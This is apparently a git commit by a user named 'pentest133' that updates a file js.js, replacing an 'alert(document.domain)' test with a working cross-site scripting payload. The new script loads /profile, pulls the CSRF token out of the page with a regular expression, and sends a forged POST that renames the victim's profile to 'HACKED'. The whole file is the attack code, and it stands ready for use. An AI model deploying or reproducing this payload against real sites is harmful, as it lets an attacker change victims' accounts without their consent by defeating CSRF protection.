6a181544e5ceaade6e72b6fcd8729a45be7038f6
pentest133 <157604553+pentest133@users.noreply.github.com>
2024-12-27 17:36:34 +0100

    Update js.js

--- js.js
+++ js.js
@@ -1,1 +1,10 @@
-alert(document.domain)
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('GET','/profile',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('POST', '/profile', true);
+    changeReq.send('_token='+token+'&name=HACKED')
+};
